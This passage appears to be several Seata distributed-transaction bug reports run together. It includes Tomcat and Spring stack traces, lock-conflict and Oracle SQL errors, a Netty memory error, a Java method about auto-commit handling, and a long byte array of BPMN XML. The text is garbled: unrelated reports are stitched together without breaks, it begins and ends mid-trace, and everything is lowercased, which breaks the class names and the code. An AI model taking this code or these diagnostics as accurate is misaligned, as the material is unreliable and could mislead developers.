~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.springframework.web.filter.httpputformcontentfilter.dofilterinternal(httpputformcontentfilter.java:109) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:198) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:493) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:140) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:81) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:87) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:342) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.coyote.http11.http11processor.service(http11processor.java:800) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:806) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1498) [tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-8.5.37.jar:8.5.37] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142) [na:1.8.0_112] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617) [na:1.8.0_112] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-8.5.37.jar:8.5.37] at java.lang.thread.run(thread.java:745) [na:1.8.0_112] ```
bug3 log, pay attention to `hi, i got lock, i will do some thing with holding this lock.`: ```
2019-09-12 14:27:15.817 info 56067 --- [nio-8102-exec-2] i.s.s.i.a.controller.taccountcontroller : testgloballock
hi, i got lock, i will do some thing with holding this lock.
2019-09-12 14:27:18.248 info 56067 --- [ing.beat.sender] com.alibaba.nacos.client.naming : [beat] public sending beat to server: {"cluster":"default","ip":"10.34.167.16","metadata":{},"port":8102,"scheduled":true,"servicename":"default_group@@dubbo-account-example","weight":1.0}
2019-09-12 14:27:18.248 info 56067 --- [ing.beat.sender] com.alibaba.nacos.client.naming : [beat] public sending beat to server: {"ip":"10.34.167.16","metadata":{"side":"provider","methods":"decreaseaccount","dubbo":"2.0.2","pid":"56067","interface":"io.seata.samples.integration.common.dubbo.accountdubboservice","version":"1.0.0","generic":"false","timeout":"3000","revision":"1.0.0","protocol":"dubbo","application":"dubbo-account-example","category":"providers","anyhost":"true","bean.name":"servicebean:io.seata.samples.integration.common.dubbo.accountdubboservice:1.0.0","timestamp":"1568269549968"},"port":20880,"scheduled":true,"servicename":"default_group@@providers:io.seata.samples.integration.common.dubbo.accountdubboservice:1.0.0","weight":1.0}
2019-09-12 14:27:18.274 error 56067 --- [nio-8102-exec-2] o.a.c.c.c.[.[.[/].[dispatcherservlet] : servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception [request processing failed; nested exception is org.springframework.transaction.transactionsystemexception: could not commit jdbc transaction; nested exception is io.seata.rm.datasource.exec.lockconflictexception] with root cause io.seata.rm.datasource.exec.lockconflictexception: null at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:108) ~[seata-all-0.8.0.jar:0.8.0]
when seata-server is running, exception below occured:
2019-09-07 11:53:29.432 info [txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.lambda$init$4:452 -exception timeout checking ..
io.seata.common.exception.storeexception: ora-00933: sql at io.seata.core.store.db.logstoredatabasedao.queryglobaltransactiondo(logstoredatabasedao.java:213) at io.seata.server.store.db.databasetransactionstoremanager.readsession(databasetransactionstoremanager.java:174) at io.seata.server.store.db.databasetransactionstoremanager.readsession(databasetransactionstoremanager.java:203) at io.seata.server.session.db.databasesessionmanager.findglobalsessions(databasesessionmanager.java:183) at io.seata.server.session.db.databasesessionmanager.allsessions(databasesessionmanager.java:172) at io.seata.server.coordinator.defaultcoordinator.timeoutcheck(defaultcoordinator.java:266) at io.seata.server.coordinator.defaultcoordinator.lambda$init$4(defaultcoordinator.java:450) at java.util.concurrent.executors$runnableadapter.call(executors.java:511) at java.util.concurrent.futuretask.runandreset$$$capture(futuretask.java:308) at java.util.concurrent.futuretask.runandreset(futuretask.java) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.access$301(scheduledthreadpoolexecutor.java:180) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:294) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
caused by: java.sql.sqlsyntaxerrorexception: ora-00933: sql at oracle.jdbc.driver.sqlstatemapping.newsqlexception(sqlstatemapping.java:91) at oracle.jdbc.driver.databaseerror.newsqlexception(databaseerror.java:133) at oracle.jdbc.driver.databaseerror.throwsqlexception(databaseerror.java:206) at oracle.jdbc.driver.t4cttioer.processerror(t4cttioer.java:455) at oracle.jdbc.driver.t4cttioer.processerror(t4cttioer.java:413) at oracle.jdbc.driver.t4c8oall.receive(t4c8oall.java:1034) at oracle.jdbc.driver.t4cpreparedstatement.dooall8(t4cpreparedstatement.java:194) at oracle.jdbc.driver.t4cpreparedstatement.executefordescribe(t4cpreparedstatement.java:791) at oracle.jdbc.driver.t4cpreparedstatement.executemaybedescribe(t4cpreparedstatement.java:866) at oracle.jdbc.driver.oraclestatement.doexecutewithtimeout(oraclestatement.java:1186) at oracle.jdbc.driver.oraclepreparedstatement.executeinternal(oraclepreparedstatement.java:3387) at oracle.jdbc.driver.oraclepreparedstatement.executequery(oraclepreparedstatement.java:3431) at oracle.jdbc.driver.oraclepreparedstatementwrapper.executequery(oraclepreparedstatementwrapper.java:1491) at org.apache.commons.dbcp.delegatingpreparedstatement.executequery(delegatingpreparedstatement.java:96) at org.apache.commons.dbcp.delegatingpreparedstatement.executequery(delegatingpreparedstatement.java:96) at io.seata.core.store.db.logstoredatabasedao.queryglobaltransactiondo(logstoredatabasedao.java:207) ..
15 common frames omitted
java.lang.nosuchmethoderror: com.alibaba.druid.util.stringutils.isempty(ljava/lang/string;)z
io.seata.common.exception.notsupportyetexception: dbtype[oracle] is not support yet! at io.seata.rm.datasource.undo.undologmanager.assertdbsupport(undologmanager.java:141) at io.seata.rm.datasource.undo.undologmanager.deleteundologbylogcreated(undologmanager.java:320) at io.seata.rm.rmhandlerat.handle(rmhandlerat.java:58) at io.seata.rm.defaultrmhandler.handle(defaultrmhandler.java:68) at io.seata.core.protocol.transaction.undologdeleterequest.handle(undologdeleterequest.java:71) at io.seata.rm.abstractrmhandler.onrequest(abstractrmhandler.java:149) at io.seata.core.rpc.netty.rmmessagelistener.handleundologdelete(rmmessagelistener.java:113) at io.seata.core.rpc.netty.rmmessagelistener.onmessage(rmmessagelistener.java:73) at io.seata.core.rpc.netty.abstractrpcremotingclient.dispatch(abstractrpcremotingclient.java:166) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
a() excuted fisrst, and b() started excuting as soon as a() was global commited.
2019-09-03 10:58:39.474 error[nettyservernioworker_8_8]io.seata.core.rpc.netty.abstractrpcremoting.exceptioncaught:424 -0318
java.lang.outofmemoryerror: direct buffer memory at java.base/java.nio.bits.reservememory(unknown source) at java.base/java.nio.directbytebuffer.<init>(unknown source) at java.base/java.nio.bytebuffer.allocatedirect(unknown source) at io.netty.buffer.poolarena$directarena.allocatedirect(poolarena.java:764) at io.netty.buffer.poolarena$directarena.newchunk(poolarena.java:740) at io.netty.buffer.poolarena.allocatenormal(poolarena.java:244) at io.netty.buffer.poolarena.allocate(poolarena.java:214) at io.netty.buffer.poolarena.allocate(poolarena.java:146) at io.netty.buffer.pooledbytebufallocator.newdirectbuffer(pooledbytebufallocator.java:324) at io.netty.buffer.abstractbytebufallocator.directbuffer(abstractbytebufallocator.java:185) at io.netty.buffer.abstractbytebufallocator.directbuffer(abstractbytebufallocator.java:176) at io.netty.buffer.abstractbytebufallocator.iobuffer(abstractbytebufallocator.java:137) at io.netty.channel.defaultmaxmessagesrecvbytebufallocator$maxmessagehandle.allocate(defaultmaxmessagesrecvbytebufallocator.java:114) at io.netty.channel.nio.abstractniobytechannel$niobyteunsafe.read(abstractniobytechannel.java:147) at io.netty.channel.nio.nioeventloop.processselectedkey(nioeventloop.java:644) at io.netty.channel.nio.nioeventloop.processselectedkeysoptimized(nioeventloop.java:579) at io.netty.channel.nio.nioeventloop.processselectedkeys(nioeventloop.java:496) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:458) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.base/java.lang.thread.run(unknown source)
use undolog kryo serializer, not add protostuff dependency, can appears load protostuff linkageerror, cause kryo class load fail.
![image](
in `abstractdmlbaseexecutor.executeautocommittrue`, `connectionproxy.setautocommit(true)` is executed in `finally` block, that may cause branch status set `successfully done` event though exception occured or rollback, because `setautocommit(true)` also calls method `commit`, and it's possible that `commit` is successful
``` protected t executeautocommittrue(object[] args) throws throwable { t result = null; abstractconnectionproxy connectionproxy = statementproxy.getconnectionproxy(); lockretrycontroller lockretrycontroller = new lockretrycontroller(); try { connectionproxy.setautocommit(false); while (true) { try { result = executeautocommitfalse(args); connectionproxy.commit(); break; } catch (lockconflictexception lockconflict) { connectionproxy.gettargetconnection().rollback(); lockretrycontroller.sleep(lockconflict); } } } catch (exception e) { // when exception occur in finally,this exception will lost, so just print it here logger.error("exception occur", e); throw e; } finally { connectionproxy.setautocommit(true); } return result; }
here is the compare log and the actual content of byte arrays, they are identical: ```
field not equals, name bytes_, old value [60, 63, 120, 109, 108, 32, 118, 101, 114, 115, 105, 111, 110, 61, 39, 49, 46, 48, 39, 32, 101, 110, 99, 111, 100, 105, 110, 103, 61, 39, 85, 84, 70, 45, 56, 39, 63, 62, 10, 60, 100, 101, 102, 105, 110, 105, 116, 105, 111, 110, 115, 32, 120, 109, 108, 110, 115, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 66, 80, 77, 78, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 77, 79, 68, 69, 76, 34, 32, 120, 109, 108, 110, 115, 58, 120, 115, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 45, 105, 110, 115, 116, 97, 110, 99, 101, 34, 32, 120, 109, 108, 110, 115, 58, 120, 115, 100, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 34, 32, 120, 109, 108, 110, 115, 58, 97, 99, 116, 105, 118, 105, 116, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 97, 99, 116, 105, 118, 105, 116, 105, 46, 111, 114, 103, 47, 98, 112, 109, 110, 34, 32, 120, 109, 108, 110, 115, 58, 98, 112, 109, 110, 100, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 66, 80, 77, 78, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 73, 34, 32, 120, 109, 108, 110, 115, 58, 111, 109, 103, 100, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 68, 68, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 67, 34, 32, 120, 109, 108, 110, 115, 58, 111, 109, 103, 100, 105, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 111, 109, 103, 46, 111, 114, 103, 47, 115, 112, 101, 99, 47, 68, 68, 47, 50, 48, 49, 48, 48, 53, 50, 52, 47, 68, 73, 34, 32, 116, 121, 112, 101, 76, 97, 110, 103, 117, 97, 103, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 50, 48, 48, 49, 47, 88, 77, 76, 83, 99, 104, 101, 109, 97, 34, 32, 101, 120, 112, 114, 101, 115, 115, 105, 111, 110, 76, 97, 110, 103, 117, 97, 103, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 49, 57, 57, 57, 47, 88, 80, 97, 116, 104, 34, 32, 116, 97, 114, 103, 101, 116, 78, 97, 109, 101, 115, 112, 97, 99, 101, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 111, 114, 103, 47, 112, 114, 111, 99, 101, 115, 115, 100, 101, 102, 34, 62, 10, 32, 32, 60, 112, 114, 111, 99, 101, 115, 115, 32, 105, 100, 61, 34, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 32, 105, 115, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 61, 34, 116, 114, 117, 101, 34, 62, 10, 32, 32, 32, 32, 60, 115, 116, 97, 114, 116, 69, 118, 101, 110, 116, 32, 105, 100, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 101, 120, 101, 99, 117, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 115, 116, 97, 114, 116, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 67, 97, 108, 108, 65, 99, 116, 105, 118, 105, 116, 121, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 60, 47, 115, 116, 97, 114, 116, 69, 118, 101, 110, 116, 62, 10, 32, 32, 32, 32, 60, 117, 115, 101, 114, 84, 97, 115, 107, 32, 105, 100, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 110, 97, 109, 101, 61, 34, 97, 100, 109, 105, 110, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 116, 97, 115, 107, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 99, 114, 101, 97, 116, 101, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 84, 97, 115, 107, 67, 114, 101, 97, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 97, 99, 116, 105, 118, 105, 116, 105, 58, 116, 97, 115, 107, 76, 105, 115, 116, 101, 110, 101, 114, 32, 101, 118, 101, 110, 116, 61, 34, 99, 111, 109, 112, 108, 101, 116, 101, 34, 32, 99, 108, 97, 115, 115, 61, 34, 99, 111, 109, 46, 104, 117, 105, 106, 117, 46, 98, 112, 109, 46, 97, 99, 116, 105, 118, 105, 116, 105, 46, 101, 120, 46, 108, 105, 115, 116, 101, 110, 101, 114, 115, 46, 84, 97, 115, 107, 67, 111, 109, 112, 108, 101, 116, 105, 111, 110, 76, 105, 115, 116, 101, 110, 101, 114, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 101, 120, 116, 101, 110, 115, 105, 111, 110, 69, 108, 101, 109, 101, 110, 116, 115, 62, 10, 32, 32, 32, 32, 60, 47, 117, 115, 101, 114, 84, 97, 115, 107, 62, 10, 32, 32, 32, 32, 60, 115, 101, 113, 117, 101, 110, 99, 101, 70, 108, 111, 119, 32, 105, 100, 61, 34, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 32, 115, 111, 117, 114, 99, 101, 82, 101, 102, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 32, 116, 97, 114, 103, 101, 116, 82, 101, 102, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 47, 62, 10, 32, 32, 32, 32, 60, 101, 110, 100, 69, 118, 101, 110, 116, 32, 105, 100, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 47, 62, 10, 32, 32, 32, 32, 60, 115, 101, 113, 117, 101, 110, 99, 101, 70, 108, 111, 119, 32, 105, 100, 61, 34, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 32, 115, 111, 117, 114, 99, 101, 82, 101, 102, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 116, 97, 114, 103, 101, 116, 82, 101, 102, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 47, 62, 10, 32, 32, 60, 47, 112, 114, 111, 99, 101, 115, 115, 62, 10, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 32, 105, 100, 61, 34, 66, 80, 77, 78, 68, 105, 97, 103, 114, 97, 109, 95, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 62, 10, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 80, 108, 97, 110, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 80, 108, 97, 110, 101, 95, 68, 73, 83, 95, 84, 82, 65, 78, 83, 95, 84, 69, 83, 84, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 50, 66, 67, 48, 65, 51, 67, 66, 45, 50, 70, 49, 68, 45, 52, 55, 68, 70, 45, 65, 68, 68, 67, 45, 55, 69, 66, 57, 51, 54, 68, 54, 70, 49, 52, 66, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 51, 48, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 51, 48, 46, 48, 34, 32, 120, 61, 34, 49, 53, 48, 46, 48, 34, 32, 121, 61, 34, 50, 48, 55, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 49, 69, 53, 68, 70, 65, 65, 49, 45, 54, 68, 65, 53, 45, 52, 54, 56, 54, 45, 56, 69, 48, 68, 45, 55, 52, 68, 68, 54, 68, 51, 69, 68, 66, 68, 51, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 56, 48, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 49, 48, 48, 46, 48, 34, 32, 120, 61, 34, 50, 56, 48, 46, 53, 34, 32, 121, 61, 34, 49, 56, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 83, 104, 97, 112, 101, 95, 115, 105, 100, 45, 69, 52, 57, 55, 50, 56, 53, 52, 45, 49, 66, 50, 53, 45, 52, 52, 57, 57, 45, 66, 57, 52, 67, 45, 67, 55, 66, 48, 48, 54, 67, 52, 54, 48, 68, 65, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 99, 58, 66, 111, 117, 110, 100, 115, 32, 104, 101, 105, 103, 104, 116, 61, 34, 50, 56, 46, 48, 34, 32, 119, 105, 100, 116, 104, 61, 34, 50, 56, 46, 48, 34, 32, 120, 61, 34, 52, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 48, 56, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 83, 104, 97, 112, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 69, 100, 103, 101, 95, 115, 105, 100, 45, 70, 50, 66, 50, 68, 49, 51, 55, 45, 57, 68, 51, 51, 45, 52, 68, 65, 55, 45, 65, 66, 67, 53, 45, 49, 57, 70, 57, 68, 66, 54, 56, 56, 55, 68, 54, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 49, 56, 48, 46, 48, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 50, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 60, 47, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 62, 10, 32, 32, 32, 32, 32, 32, 60, 98, 112, 109, 110, 100, 105, 58, 66, 80, 77, 78, 69, 100, 103, 101, 32, 98, 112, 109, 110, 69, 108, 101, 109, 101, 110, 116, 61, 34, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 32, 105, 100, 61, 34, 66, 80, 77, 78, 69, 100, 103, 101, 95, 115, 105, 100, 45, 67, 55, 50, 70, 57, 54, 51, 70, 45, 68, 69, 57, 56, 45, 52, 53, 53, 70, 45, 56, 48, 68, 67, 45, 54, 70, 52, 49, 65, 67, 68, 53, 69, 50, 55, 54, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 51, 56, 48, 46, 53, 34, 32, 121, 61, 34, 50, 50, 50, 46, 48, 34, 47, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 111, 109, 103, 100, 105, 58, 119, 97, 121, 112, 111, 105, 110, 116, 32, 120, 61, 34, 52, 56, 